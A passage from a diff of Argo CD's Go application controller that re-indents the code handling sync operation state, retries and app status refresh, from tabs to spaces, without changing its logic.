synccommon.OperationError\n+                        if rerr, ok := r.(error); ok {\n+                                state.Message = rerr.Error()\n+                        } else {\n+                                state.Message = fmt.Sprintf(\"%v\", r)\n+                        }\n+                        ctrl.setOperationState(app, state)\n+                }\n+        }()\n+        terminating := false\n+        if isOperationInProgress(app) {\n+                state = app.Status.OperationState.DeepCopy()\n+                terminating = state.Phase == synccommon.OperationTerminating\n+                // Failed  operation with retry strategy might have be in-progress and has completion time\n+                if state.FinishedAt != nil && !terminating {\n+                        retryAt, err := app.Status.OperationState.Operation.Retry.NextRetryAt(state.FinishedAt.Time, state.RetryCount)\n+                        if err != nil {\n+                                state.Phase = synccommon.OperationFailed\n+                                state.Message = err.Error()\n+                                ctrl.setOperationState(app, state)\n+                                return\n+                        }\n+                        retryAfter := time.Until(retryAt)\n+                        if retryAfter > 0 {\n+                                logCtx.Infof(\"Skipping retrying in-progress operation. Attempting again at: %s\", retryAt.Format(time.RFC3339))\n+                                ctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), &retryAfter)\n+                                return\n+                        } else {\n+                                // retrying operation. remove previous failure time in app since it is used as a trigger\n+                                // that previous failed and operation should be retried\n+                                state.FinishedAt = nil\n+                                ctrl.setOperationState(app, state)\n+                                // Get rid of sync results and null out previous operation completion time\n+                                state.SyncResult = nil\n+                        }\n+                } else {\n+                        logCtx.Infof(\"Resuming in-progress operation. phase: %s, message: %s\", state.Phase, state.Message)\n+                }\n+        } else {\n+                state = &appv1.OperationState{Phase: synccommon.OperationRunning, Operation: *app.Operation, StartedAt: metav1.Now()}\n+                ctrl.setOperationState(app, state)\n+                logCtx.Infof(\"Initialized new operation: %v\", *app.Operation)\n+        }\n+\n+        if err := argo.ValidateDestination(context.Background(), &app.Spec.Destination, ctrl.db); err != nil {\n+                state.Phase = synccommon.OperationFailed\n+                state.Message = err.Error()\n+        } else {\n+                ctrl.appStateManager.SyncAppState(app, state)\n+        }\n+\n+        // Check whether application is allowed to use project\n+        _, err := ctrl.getAppProj(app)\n+        if err != nil {\n+                state.Phase = synccommon.OperationError\n+                state.Message = err.Error()\n+        }\n+\n+        if state.Phase == synccommon.OperationRunning {\n+                // It's possible for an app to be terminated while we were operating on it. We do not want\n+                // to clobber the Terminated state with Running. Get the latest app state to check for this.\n+                freshApp, err := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace).Get(context.Background(), app.ObjectMeta.Name, metav1.GetOptions{})\n+                if err == nil {\n+                        // App may have lost permissions to use the project meanwhile.\n+                        _, err = ctrl.getAppProj(freshApp)\n+                        if err != nil {\n+                                state.Phase = synccommon.OperationFailed\n+                                state.Message = fmt.Sprintf(\"operation not allowed: %v\", err)\n+                        }\n+                        if freshApp.Status.OperationState != nil && freshApp.Status.OperationState.Phase == synccommon.OperationTerminating {\n+                                state.Phase = synccommon.OperationTerminating\n+                                state.Message = \"operation is terminating\"\n+                                // after this, we will get requeued to the workqueue, but next time the\n+                                // SyncAppState will operate in a Terminating phase, allowing the worker to perform\n+                                // cleanup (e.g. delete jobs, workflows, etc...)\n+                        }\n+                }\n+        } else if state.Phase == synccommon.OperationFailed || state.Phase == synccommon.OperationError {\n+                if !terminating && (state.RetryCount < state.Operation.Retry.Limit || state.Operation.Retry.Limit < 0) {\n+                        now := metav1.Now()\n+                        state.FinishedAt = &now\n+                        if retryAt, err := state.Operation.Retry.NextRetryAt(now.Time, state.RetryCount); err != nil {\n+                                state.Phase = synccommon.OperationFailed\n+                                state.Message = fmt.Sprintf(\"%s (failed to retry: %v)\", state.Message, err)\n+                        } else {\n+                                state.Phase = synccommon.OperationRunning\n+                                state.RetryCount++\n+                                state.Message = fmt.Sprintf(\"%s. Retrying attempt #%d at %s.\", state.Message, state.RetryCount, retryAt.Format(time.Kitchen))\n+                        }\n+                } else if state.RetryCount > 0 {\n+                        state.Message = fmt.Sprintf(\"%s (retried %d times).\", state.Message, state.RetryCount)\n+                }\n+\n+        }\n+\n+        ctrl.setOperationState(app, state)\n+        if state.Phase.Completed() && (app.Operation.Sync != nil && !app.Operation.Sync.DryRun) {\n+                // if we just completed an operation, force a refresh so that UI will report up-to-date\n+                // sync/health information\n+                if _, err := cache.MetaNamespaceKeyFunc(app); err == nil {\n+                        // force app refresh with using CompareWithLatest comparison type and trigger app reconciliation loop\n+                        ctrl.requestAppRefresh(app.QualifiedName(), CompareWithLatest.Pointer(), nil)\n+                } else {\n+                        logCtx.Warnf(\"Fails to requeue application: %v\", err)\n+                }\n+        }\n }\n \n func (ctrl *ApplicationController) setOperationState(app *appv1.Application, state *appv1.OperationState) {\n-\tkube.RetryUntilSucceed(context.Background(), updateOperationStateTimeout, \"Update application operation state\", logutils.NewLogrusLogger(logutils.NewWithCurrentConfig()), func() error {\n-\t\tif state.Phase == \"\" {\n-\t\t\t// expose any bugs where we neglect to set phase\n-\t\t\tpanic(\"no phase was set\")\n-\t\t}\n-\t\tif state.Phase.Completed() {\n-\t\t\tnow := metav1.Now()\n-\t\t\tstate.FinishedAt = &now\n-\t\t}\n-\t\tpatch := map[string]interface{}{\n-\t\t\t\"status\": map[string]interface{}{\n-\t\t\t\t\"operationState\": state,\n-\t\t\t},\n-\t\t}\n-\t\tif state.Phase.Completed() {\n-\t\t\t// If operation is completed, clear the operation field to indicate no operation is\n-\t\t\t// in progress.\n-\t\t\tpatch[\"operation\"] = nil\n-\t\t}\n-\t\tif reflect.DeepEqual(app.Status.OperationState, state) {\n-\t\t\tlog.Infof(\"No operation updates necessary to '%s'. Skipping patch\", app.QualifiedName())\n-\t\t\treturn nil\n-\t\t}\n-\t\tpatchJSON, err := json.Marshal(patch)\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error marshaling json: %w\", err)\n-\t\t}\n-\t\tif app.Status.OperationState != nil && app.Status.OperationState.FinishedAt != nil && state.FinishedAt == nil {\n-\t\t\tpatchJSON, err = jsonpatch.MergeMergePatches(patchJSON, []byte(`{\"status\": {\"operationState\": {\"finishedAt\": null}}}`))\n-\t\t\tif err != nil {\n-\t\t\t\treturn fmt.Errorf(\"error merging operation state patch: %w\", err)\n-\t\t\t}\n-\t\t}\n-\n-\t\tappClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n-\t\t_, err = appClient.Patch(context.Background(), app.Name, types.MergePatchType, patchJSON, metav1.PatchOptions{})\n-\t\tif err != nil {\n-\t\t\t// Stop retrying updating deleted application\n-\t\t\tif apierr.IsNotFound(err) {\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t\treturn fmt.Errorf(\"error patching application with operation state: %w\", err)\n-\t\t}\n-\t\tlog.Infof(\"updated '%s' operation (phase: %s)\", app.QualifiedName(), state.Phase)\n-\t\tif state.Phase.Completed() {\n-\t\t\teventInfo := argo.EventInfo{Reason: argo.EventReasonOperationCompleted}\n-\t\t\tvar messages []string\n-\t\t\tif state.Operation.Sync != nil && len(state.Operation.Sync.Resources) > 0 {\n-\t\t\t\tmessages = []string{\"Partial sync operation\"}\n-\t\t\t} else {\n-\t\t\t\tmessages = []string{\"Sync operation\"}\n-\t\t\t}\n-\t\t\tif state.SyncResult != nil {\n-\t\t\t\tmessages = append(messages, \"to\", state.SyncResult.Revision)\n-\t\t\t}\n-\t\t\tif state.Phase.Successful() {\n-\t\t\t\teventInfo.Type = v1.EventTypeNormal\n-\t\t\t\tmessages = append(messages, \"succeeded\")\n-\t\t\t} else {\n-\t\t\t\teventInfo.Type = v1.EventTypeWarning\n-\t\t\t\tmessages = append(messages, \"failed:\", state.Message)\n-\t\t\t}\n-\t\t\tctrl.auditLogger.LogAppEvent(app, eventInfo, strings.Join(messages, \" \"))\n-\t\t\tctrl.metricsServer.IncSync(app, state)\n-\t\t}\n-\t\treturn nil\n-\t})\n+        kube.RetryUntilSucceed(context.Background(), updateOperationStateTimeout, \"Update application operation state\", logutils.NewLogrusLogger(logutils.NewWithCurrentConfig()), func() error {\n+                if state.Phase == \"\" {\n+                        // expose any bugs where we neglect to set phase\n+                        panic(\"no phase was set\")\n+                }\n+                if state.Phase.Completed() {\n+                        now := metav1.Now()\n+                        state.FinishedAt = &now\n+                }\n+                patch := map[string]interface{}{\n+                        \"status\": map[string]interface{}{\n+                                \"operationState\": state,\n+                        },\n+                }\n+                if state.Phase.Completed() {\n+                        // If operation is completed, clear the operation field to indicate no operation is\n+                        // in progress.\n+                        patch[\"operation\"] = nil\n+                }\n+                if reflect.DeepEqual(app.Status.OperationState, state) {\n+                        log.Infof(\"No operation updates necessary to '%s'. Skipping patch\", app.QualifiedName())\n+                        return nil\n+                }\n+                patchJSON, err := json.Marshal(patch)\n+                if err != nil {\n+                        return fmt.Errorf(\"error marshaling json: %w\", err)\n+                }\n+                if app.Status.OperationState != nil && app.Status.OperationState.FinishedAt != nil && state.FinishedAt == nil {\n+                        patchJSON, err = jsonpatch.MergeMergePatches(patchJSON, []byte(`{\"status\": {\"operationState\": {\"finishedAt\": null}}}`))\n+                        if err != nil {\n+                                return fmt.Errorf(\"error merging operation state patch: %w\", err)\n+                        }\n+                }\n+\n+                appClient := ctrl.applicationClientset.ArgoprojV1alpha1().Applications(app.Namespace)\n+                _, err = appClient.Patch(context.Background(), app.Name, types.MergePatchType, patchJSON, metav1.PatchOptions{})\n+                if err != nil {\n+                        // Stop retrying updating deleted application\n+                        if apierr.IsNotFound(err) {\n+                                return nil\n+                        }\n+                        return fmt.Errorf(\"error patching application with operation state: %w\", err)\n+                }\n+                log.Infof(\"updated '%s' operation (phase: %s)\", app.QualifiedName(), state.Phase)\n+                if state.Phase.Completed() {\n+                        eventInfo := argo.EventInfo{Reason: argo.EventReasonOperationCompleted}\n+                        var messages []string\n+                        if state.Operation.Sync != nil && len(state.Operation.Sync.Resources) > 0 {\n+                                messages = []string{\"Partial sync operation\"}\n+                        } else {\n+                                messages = []string{\"Sync operation\"}\n+                        }\n+                        if state.SyncResult != nil {\n+                                messages = append(messages, \"to\", state.SyncResult.Revision)\n+                        }\n+                        if state.Phase.Successful() {\n+                                eventInfo.Type = v1.EventTypeNormal\n+                                messages = append(messages, \"succeeded\")\n+                        } else {\n+                                eventInfo.Type = v1.EventTypeWarning\n+                                messages = append(messages, \"failed:\", state.Message)\n+                        }\n+                        ctrl.auditLogger.LogAppEvent(app, eventInfo, strings.Join(messages, \" \"))\n+                        ctrl.metricsServer.IncSync(app, state)\n+                }\n+                return nil\n+        })\n }\n \n func (ctrl *ApplicationController) processAppRefreshQueueItem() (processNext bool) {\n-\tappKey, shutdown := ctrl.appRefreshQueue.Get()\n-\tif shutdown {\n-\t\tprocessNext = false\n-\t\treturn\n-\t}\n-\tprocessNext = true\n-\tdefer func() {\n-\t\tif r := recover(); r != nil {\n-\t\t\tlog.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n-\t\t}\n-\t\tctrl.appRefreshQueue.Done(appKey)\n-\t}()\n-\tobj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey.(string))\n-\tif err != nil {\n-\t\tlog.Errorf(\"Failed to get application '%s' from informer index: %+v\", appKey, err)\n-\t\treturn\n-\t}\n-\tif !exists {\n-\t\t// This happens after app was deleted, but the work queue still had an entry for it.\n-\t\treturn\n-\t}\n-\torigApp, ok := obj.(*appv1.Application)\n-\tif !ok {\n-\t\tlog.Warnf(\"Key '%s' in index is not an application\", appKey)\n-\t\treturn\n-\t}\n-\torigApp = origApp.DeepCopy()\n-\tneedRefresh, refreshType, comparisonLevel := ctrl.needRefreshAppStatus(origApp, ctrl.statusRefreshTimeout, ctrl.statusHardRefreshTimeout)\n-\n-\tif !needRefresh {\n-\t\treturn\n-\t}\n-\tapp := origApp.DeepCopy()\n-\tlogCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n-\n-\tstartTime := time.Now()\n-\tdefer func() {\n-\t\treconcileDuration := time.Since(startTime)\n-\t\tctrl.metricsServer.IncReconcile(origApp, reconcileDuration)\n-\t\tlogCtx.WithFields(log.Fields{\n-\t\t\t\"time_ms\":        reconcileDuration.Milliseconds(),\n-\t\t\t\"level\":          comparisonLevel,\n-\t\t\t\"dest-server\":    origApp.Spec.Destination.Server,\n-\t\t\t\"dest-name\":      origApp.Spec.Destination.Name,\n-\t\t\t\"dest-namespace\": origApp.Spec.Destination.Namespace,\n-\t\t}).Info(\"Reconciliation completed\")\n-\t}()\n-\n-\tif comparisonLevel == ComparisonWithNothing {\n-\t\tmanagedResources := make([]*appv1.ResourceDiff, 0)\n-\t\tif err := ctrl.cache.GetAppManagedResources(app.InstanceName(ctrl.namespace), &managedResources); err != nil {\n-\t\t\tlogCtx.Warnf(\"Failed to get cached managed resources for tree reconciliation, fall back to full reconciliation\")\n-\t\t} else {\n-\t\t\tvar tree *appv1.ApplicationTree\n-\t\t\tif tree, err = ctrl.getResourceTree(app, managedResources); err == nil {\n-\t\t\t\tapp.Status.Summary = tree.GetSummary()\n-\t\t\t\tif err := ctrl.cache.SetAppResourcesTree(app.InstanceName(ctrl.namespace), tree); err != nil {\n-\t\t\t\t\tlogCtx.Errorf(\"Failed to cache resources tree: %v\", err)\n-\t\t\t\t\treturn\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tctrl.persistAppStatus(origApp, &app.Status)\n-\t\t\treturn\n-\t\t}\n-\t}\n-\n-\tproject, hasErrors := ctrl.refreshAppConditions(app)\n-\tif hasErrors {\n-\t\tapp.Status.Sync.Status = appv1.SyncStatusCodeUnknown\n-\t\tapp.Status.Health.Status = health.HealthStatusUnknown\n-\t\tctrl.persistAppStatus(origApp, &app.Status)\n-\n-\t\tif err := ctrl.cache.SetAppResourcesTree(app.InstanceName(ctrl.namespace), &appv1.ApplicationTree{}); err != nil {\n-\t\t\tlog.Warnf(\"failed to set app resource tree: %v\", err)\n-\t\t}\n-\t\tif err := ctrl.cache.SetAppManagedResources(app.InstanceName(ctrl.namespace), nil); err != nil {\n-\t\t\tlog.Warnf(\"failed to set app managed resources tree: %v\", err)\n-\t\t}\n-\t\treturn\n-\t}\n-\n-\tvar localManifests []string\n-\tif opState := app.Status.OperationState; opState != nil && opState.Operation.Sync != nil {\n-\t\tlocalManifests = opState.Operation.Sync.Manifests\n-\t}\n-\n-\trevisions := make([]string, 0)\n-\tsources := make([]appv1.ApplicationSource, 0)\n-\n-\thasMultipleSources := app.Spec.HasMultipleSources()\n-\n-\t// If we have multiple sources, we use all the sources under `sources` field and ignore source under `source` field.\n-\t// else we use the source under the source field.\n-\tif hasMultipleSources {\n-\t\tfor _, source := range app.Spec.Sources {\n-\t\t\t// We do not perform any filtering of duplicate sources.\n-\t\t\t// Argo CD will apply and update the resources generated from the sources automatically\n-\t\t\t// based on the order in which manifests were generated\n-\t\t\tsources = append(sources, source)\n-\t\t\trevisions = append(revisions, source.TargetRevision)\n-\t\t}\n-\t\tif comparisonLevel == CompareWithRecent {\n-\t\t\trevisions = app.Status.Sync.Revisions\n-\t\t}\n-\t} else {\n-\t\trevision := app.Spec.GetSource().TargetRevision\n-\t\tif comparisonLevel == CompareWithRecent {\n-\t\t\trevision = app.Status.Sync.Revision\n-\t\t}\n-\t\trevisions = append(revisions, revision)\n-\t\tsources = append(sources, app.Spec.GetSource())\n-\t}\n-\tnow := metav1.Now()\n-\n-\tcompareResult := ctrl.appStateManager.CompareAppState(app, project, revisions, sources,\n-\t\trefreshType == appv1.RefreshTypeHard,\n-\t\tcomparisonLevel == CompareWithLatestForceResolve, localManifests, hasMultipleSources)\n-\n-\tfor k, v := range compareResult.timings {\n-\t\tlogCtx = logCtx.WithField(k, v.Milliseconds())\n-\t}\n-\n-\tctrl.normalizeApplication(origApp, app)\n-\n-\ttree, err := ctrl.setAppManagedResources(app, compareResult)\n-\tif err != nil {\n-\t\tlogCtx.Errorf(\"Failed to cache app resources: %v\", err)\n-\t} else {\n-\t\tapp.Status.Summary = tree.GetSummary()\n-\t}\n-\n-\tif project.Spec.SyncWindows.Matches(app).CanSync(false) {\n-\t\tsyncErrCond := ctrl.autoSync(app, compareResult.syncStatus, compareResult.resources)\n-\t\tif syncErrCond != nil {\n-\t\t\tapp.Status.SetConditions(\n-\t\t\t\t[]appv1.ApplicationCondition{*syncErrCond},\n-\t\t\t\tmap[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionSyncError: true},\n-\t\t\t)\n-\t\t} else {\n-\t\t\tapp.Status.SetConditions(\n-\t\t\t\t[]appv1.ApplicationCondition{},\n-\t\t\t\tmap[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionSyncError: true},\n-\t\t\t)\n-\t\t}\n-\t} else {\n-\t\tlogCtx.Info(\"Sync prevented by sync window\")\n-\t}\n-\n-\tif app.Status.ReconciledAt == nil || comparisonLevel >= CompareWithLatest {\n-\t\tapp.Status.ReconciledAt = &now\n-\t}\n-\tapp.Status.Sync = *compareResult.syncStatus\n-\tapp.Status.Health = *compareResult.healthStatus\n-\tapp.Status.Resources = compareResult.resources\n-\tsort.Slice(app.Status.Resources, func(i, j int) bool {\n-\t\treturn resourceStatusKey(app.Status.Resources[i]) < resourceStatusKey(app.Status.Resources[j])\n-\t})\n-\tapp.Status.SourceType = compareResult.appSourceType\n-\tapp.Status.SourceTypes = compareResult.appSourceTypes\n-\tctrl.persistAppStatus(origApp, &app.Status)\n-\treturn\n+        appKey, shutdown := ctrl.appRefreshQueue.Get()\n+        if shutdown {\n+                processNext = false\n+                return\n+        }\n+        processNext = true\n+        defer func() {\n+                if r := recover(); r != nil {\n+                        log.Errorf(\"Recovered from panic: %+v\\n%s\", r, debug.Stack())\n+                }\n+                ctrl.appRefreshQueue.Done(appKey)\n+        }()\n+        obj, exists, err := ctrl.appInformer.GetIndexer().GetByKey(appKey.(string))\n+        if err != nil {\n+                log.Errorf(\"Failed to get application '%s' from informer index: %+v\", appKey, err)\n+                return\n+        }\n+        if !exists {\n+                // This happens after app was deleted, but the work queue still had an entry for it.\n+                return\n+        }\n+        origApp, ok := obj.(*appv1.Application)\n+        if !ok {\n+                log.Warnf(\"Key '%s' in index is not an application\", appKey)\n+                return\n+        }\n+        origApp = origApp.DeepCopy()\n+        needRefresh, refreshType, comparisonLevel := ctrl.needRefreshAppStatus(origApp, ctrl.statusRefreshTimeout, ctrl.statusHardRefreshTimeout)\n+\n+        if !needRefresh {\n+                return\n+        }\n+        app := origApp.DeepCopy()\n+        logCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n+\n+        startTime := time.Now()\n+        defer func() {\n+                reconcileDuration := time.Since(startTime)\n+                ctrl.metricsServer.IncReconcile(origApp, reconcileDuration)\n+                logCtx.WithFields(log.Fields{\n+                        \"time_ms\":        reconcileDuration.Milliseconds(),\n+                        \"level\":          comparisonLevel,\n+                        \"dest-server\":    origApp.Spec.Destination.Server,\n+                        \"dest-name\":      origApp.Spec.Destination.Name,\n+                        \"dest-namespace\": origApp.Spec.Destination.Namespace,\n+                }).Info(\"Reconciliation completed\")\n+        }()\n+\n+        if comparisonLevel == ComparisonWithNothing {\n+                managedResources := make([]*appv1.ResourceDiff, 0)\n+                if err := ctrl.cache.GetAppManagedResources(app.InstanceName(ctrl.namespace), &managedResources); err != nil {\n+                        logCtx.Warnf(\"Failed to get cached managed resources for tree reconciliation, fall back to full reconciliation\")\n+                } else {\n+                        var tree *appv1.ApplicationTree\n+                        if tree, err = ctrl.getResourceTree(app, managedResources); err == nil {\n+                                app.Status.Summary = tree.GetSummary()\n+                                if err := ctrl.cache.SetAppResourcesTree(app.InstanceName(ctrl.namespace), tree); err != nil {\n+                                        logCtx.Errorf(\"Failed to cache resources tree: %v\", err)\n+                                        return\n+                                }\n+                        }\n+\n+                        ctrl.persistAppStatus(origApp, &app.Status)\n+                        return\n+                }\n+        }\n+\n+        project, hasErrors := ctrl.refreshAppConditions(app)\n+        if hasErrors {\n+                app.Status.Sync.Status = appv1.SyncStatusCodeUnknown\n+                app.Status.Health.Status = health.HealthStatusUnknown\n+                ctrl.persistAppStatus(origApp, &app.Status)\n+\n+                if err := ctrl.cache.SetAppResourcesTree(app.InstanceName(ctrl.namespace), &appv1.ApplicationTree{}); err != nil {\n+                        log.Warnf(\"failed to set app resource tree: %v\", err)\n+                }\n+                if err := ctrl.cache.SetAppManagedResources(app.InstanceName(ctrl.namespace), nil); err != nil {\n+                        log.Warnf(\"failed to set app managed resources tree: %v\", err)\n+                }\n+                return\n+        }\n+\n+        var localManifests []string\n+        if opState := app.Status.OperationState; opState != nil && opState.Operation.Sync != nil {\n+                localManifests = opState.Operation.Sync.Manifests\n+        }\n+\n+        revisions := make([]string, 0)\n+        sources := make([]appv1.ApplicationSource, 0)\n+\n+        hasMultipleSources := app.Spec.HasMultipleSources()\n+\n+        // If we have multiple sources, we use all the sources under `sources` field and ignore source under `source` field.\n+        // else we use the source under the source field.\n+        if hasMultipleSources {\n+                for _, source := range app.Spec.Sources {\n+                        // We do not perform any filtering of duplicate sources.\n+                        // Argo CD will apply and update the resources generated from the sources automatically\n+                        // based on the order in which manifests were generated\n+                        sources = append(sources, source)\n+                        revisions = append(revisions, source.TargetRevision)\n+                }\n+                if comparisonLevel == CompareWithRecent {\n+                        revisions = app.Status.Sync.Revisions\n+                }\n+        } else {\n+                revision := app.Spec.GetSource().TargetRevision\n+                if comparisonLevel == CompareWithRecent {\n+                        revision = app.Status.Sync.Revision\n+                }\n+                revisions = append(revisions, revision)\n+                sources = append(sources, app.Spec.GetSource())\n+        }\n+        now := metav1.Now()\n+\n+        compareResult := ctrl.appStateManager.CompareAppState(app, project, revisions, sources,\n+                refreshType == appv1.RefreshTypeHard,\n+                comparisonLevel == CompareWithLatestForceResolve, localManifests, hasMultipleSources)\n+\n+        for k, v := range compareResult.timings {\n+                logCtx = logCtx.WithField(k, v.Milliseconds())\n+        }\n+\n+        ctrl.normalizeApplication(origApp, app)\n+\n+        tree, err := ctrl.setAppManagedResources(app, compareResult)\n+        if err != nil {\n+                logCtx.Errorf(\"Failed to cache app resources: %v\", err)\n+        } else {\n+                app.Status.Summary = tree.GetSummary()\n+        }\n+\n+        if project.Spec.SyncWindows.Matches(app).CanSync(false) {\n+                syncErrCond := ctrl.autoSync(app, compareResult.syncStatus, compareResult.resources)\n+                if syncErrCond != nil {\n+                        app.Status.SetConditions(\n+                                []appv1.ApplicationCondition{*syncErrCond},\n+                                map[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionSyncError: true},\n+                        )\n+                } else {\n+                        app.Status.SetConditions(\n+                                []appv1.ApplicationCondition{},\n+                                map[appv1.ApplicationConditionType]bool{appv1.ApplicationConditionSyncError: true},\n+                        )\n+                }\n+        } else {\n+                logCtx.Info(\"Sync prevented by sync window\")\n+        }\n+\n+        if app.Status.ReconciledAt == nil || comparisonLevel >= CompareWithLatest {\n+                app.Status.ReconciledAt = &now\n+        }\n+        app.Status.Sync = *compareResult.syncStatus\n+        app.Status.Health = *compareResult.healthStatus\n+        app.Status.Resources = compareResult.resources\n+        sort.Slice(app.Status.Resources, func(i, j int) bool {\n+                return resourceStatusKey(app.Status.Resources[i]) < resourceStatusKey(app.Status.Resources[j])\n+        })\n+        app.Status.SourceType = compareResult.appSourceType\n+        app.Status.SourceTypes = compareResult.appSourceTypes\n+        ctrl.persistAppStatus(origApp, &app.Status)\n+        return\n }\n \n func resourceStatusKey(res appv1.ResourceStatus) string {\n-\treturn strings.Join([]string{res.Group, res.Kind, res.Namespace, res.Name}, \"/\")\n+        return strings.Join([]string{res.Group, res.Kind, res.Namespace, res.Name}, \"/\")\n }\n \n // needRefreshAppStatus answers if application status needs to be refreshed.\n@@ -1474,491 +1474,491 @@ func resourceStatusKey(res appv1.ResourceStatus) string {\n // Additionally returns whether full refresh was requested or not.\n // If full refresh is requested then target and live state should be reconciled, else only live state tree should be updated.\n func (ctrl *ApplicationController) needRefreshAppStatus(app *appv1.Application, statusRefreshTimeout, statusHardRefreshTimeout time.Duration) (bool, appv1.RefreshType, CompareWith) {\n-\tlogCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n-\tvar reason string\n-\tcompareWith := CompareWithLatest\n-\trefreshType := appv1.RefreshTypeNormal\n-\tsoftExpired := app.Status.ReconciledAt == nil || app.Status.ReconciledAt.Add(statusRefreshTimeout).Before(time.Now().UTC())\n-\thardExpired := (app.Status.ReconciledAt == nil || app.Status.ReconciledAt.Add(statusHardRefreshTimeout).Before(time.Now().UTC())) && statusHardRefreshTimeout.Seconds() != 0\n-\n-\tif requestedType, ok := app.IsRefreshRequested(); ok {\n-\t\tcompareWith = CompareWithLatestForceResolve\n-\t\t// user requested app refresh.\n-\t\trefreshType = requestedType\n-\t\treason = fmt.Sprintf(\"%s refresh requested\", refreshType)\n-\t} else {\n-\t\tif app.Spec.HasMultipleSources() {\n-\t\t\tif (len(app.Spec.Sources) != len(app.Status.Sync.ComparedTo.Sources)) || !reflect.DeepEqual(app.Spec.Sources, app.Status.Sync.ComparedTo.Sources) {\n-\t\t\t\treason = \"atleast one of the spec.sources differs\"\n-\t\t\t\tcompareWith = CompareWithLatestForceResolve\n-\t\t\t}\n-\t\t} else if !app.Spec.Source.Equals(app.Status.Sync.ComparedTo.Source) {\n-\t\t\treason = \"spec.source differs\"\n-\t\t\tcompareWith = CompareWithLatestForceResolve\n-\t\t} else if hardExpired || softExpired {\n-\t\t\t// The commented line below mysteriously crashes if app.Status.ReconciledAt is nil\n-\t\t\t// reason = fmt.Sprintf(\"comparison expired. reconciledAt: %v, expiry: %v\", app.Status.ReconciledAt, statusRefreshTimeout)\n-\t\t\t//TODO: find existing Golang bug or create a new one\n-\t\t\treconciledAtStr := \"never\"\n-\t\t\tif app.Status.ReconciledAt != nil {\n-\t\t\t\treconciledAtStr = app.Status.ReconciledAt.String()\n-\t\t\t}\n-\t\t\treason = fmt.Sprintf(\"comparison expired, requesting refresh. reconciledAt: %v, expiry: %v\", reconciledAtStr, statusRefreshTimeout)\n-\t\t\tif hardExpired {\n-\t\t\t\treason = fmt.Sprintf(\"comparison expired, requesting hard refresh. reconciledAt: %v, expiry: %v\", reconciledAtStr, statusHardRefreshTimeout)\n-\t\t\t\trefreshType = appv1.RefreshTypeHard\n-\t\t\t}\n-\t\t} else if !app.Spec.Destination.Equals(app.Status.Sync.ComparedTo.Destination) {\n-\t\t\treason = \"spec.destination differs\"\n-\t\t} else if requested, level := ctrl.isRefreshRequested(app.QualifiedName()); requested {\n-\t\t\tcompareWith = level\n-\t\t\treason = \"controller refresh requested\"\n-\t\t}\n-\t}\n-\n-\tif reason != \"\" {\n-\t\tlogCtx.Infof(\"Refreshing app status (%s), level (%d)\", reason, compareWith)\n-\t\treturn true, refreshType, compareWith\n-\t}\n-\treturn false, refreshType, compareWith\n+        logCtx := log.WithFields(log.Fields{\"application\": app.QualifiedName()})\n+        var reason string\n+        compareWith := CompareWithLatest\n+        refreshType := appv1.RefreshTypeNormal\n+        softExpired := app.Status.ReconciledAt == nil || app.Status.ReconciledAt.Add(statusRefreshTimeout).Before(time.Now().UTC())\n+        hardExpired := (app.Status.ReconciledAt == nil || app.Status.ReconciledAt.Add(statusHardRefreshTimeout).Before(time.Now().UTC())) && statusHardRefreshTimeout.Seconds() != 0\n+\n+        if requestedType, ok := app.IsRefreshRequested(); ok {\n+                compareWith = CompareWithLatestForceResolve\n+                // user requested app refresh.\n+                refreshType = requestedType\n+                reason = fmt.Sprintf(\"%s refresh requested\", refreshType)\n+        } else {\n+                if app.Spec.HasMultipleSources() {\n+                        if (len(app.Spec.Sources) != len(app.Status.Sync.ComparedTo.Sources)) || !reflect.DeepEqual(app.Spec.Sources, app.Status.Sync.ComparedTo.Sources) {\n+                                reason = \"atleast one of the spec.sources differs\"\n+                                compareWith = CompareWithLatestForceResolve\n+                        }\n+                } else if !app.Spec.Source.Equals(app.Status.Sync.ComparedTo.Source) {\n+                        reason = \"spec.source differs\"\n+                        compareWith = CompareWithLatestForceResolve\n+                } else if hardExpired || softExpired {\n+                        // The commented line below mysteriously crashes if app.Status.ReconciledAt is nil\n+                        // reason = fmt.Sprintf(\"comparison expired. reconciledAt: %v, expiry: %v\", app.Status.ReconciledAt, statusRefreshTimeout)\n+                        //TODO: find existing Golang bug or create a new one\n+                        reconciledAtStr := \"never\"\n+                        if app.Status.ReconciledAt != nil {\n+                                reconciledAtStr = app.Status.ReconciledAt.String()\n+                        }\n+                        reason = fmt.Sprintf(\"comparison expired, requesting refresh. reconciledAt: %v, expiry: %v\", reconciledAtStr, statusRefreshTimeout)\n+                        if hardExpired {\n+                                reason = fmt.Sprintf(\"comparison expired, requesting hard refresh. reconciledAt: %v, expiry: %v\", reconciledAtStr, statusHardRefreshTimeout)\n+                                refreshType = appv1.RefreshTypeHard\n+                        }\n+                } else if !app.Spec.Destination.Equals(app.Status.Sync.ComparedTo.Destination) {\n+                        reason = \"spec.destination differs\"\n+                } else if requested, level := ctrl.isRefreshRequested(app.QualifiedName()); requested {\n+                        compareWith = level\n+                        reason = \"controller refresh requested\"\n+                }\n+        }\n+\n+        if reason != \"\" {\n+                logCtx.Infof(\"Refreshing app status (%s), level (%d)\", reason, compareWith)\n+                return true, refreshType, compareWith\n+        }\n+        return false, refreshType, compareWith\n }\n \n func (ctrl *ApplicationController) refreshAppConditions(app *appv1.Application) (*appv1.AppProject, bool) {\n-\terrorConditions := make([]appv1.ApplicationCondition, 0)\n-\tproj, err := ctrl.getAppProj(app)\n-\tif err != nil {\n-\t\terrorConditions = append(errorConditions, ctrl.projectErrorToCondition(err, app))\n-\t} else {\n-\t\tspecConditions, err := argo.ValidatePermissions(context.Background(), &app.Spec, proj, ctrl.db)\n-\t\tif err != nil {\n-\t\t\terrorConditions = append(errorConditions, appv1.ApplicationCondition{\n-\t\t\t\tType:    